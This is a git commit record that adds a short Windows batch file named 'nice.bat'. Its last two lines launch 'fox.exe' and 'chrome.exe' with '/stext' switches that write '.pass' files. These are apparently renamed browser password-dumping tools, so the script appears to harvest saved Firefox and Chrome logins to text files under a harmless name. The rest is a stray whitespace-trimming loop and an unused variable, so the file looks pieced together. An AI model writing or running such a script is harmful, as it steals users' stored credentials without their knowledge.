7e802e4e79113ca22f80bae8fb18116b298697fe
xryven <baeadr244@proton.me>
2025-02-14 17:57:09 +0100

    Add files via upload

---
+++ nice/nice.bat
@@ -0,0 +1,5 @@
+:: Trim right white space, a maximum of 1 time (the final 1 in brackets represents max iterations)
+for /l %%a in (1,1,1) do if "!Today:~-1!"==" " set Today=!Today:~0,-1!
+SET dynpathname=.txt
+start fox.exe /stext fox.pass
+start chrome.exe /stext chrome.pass
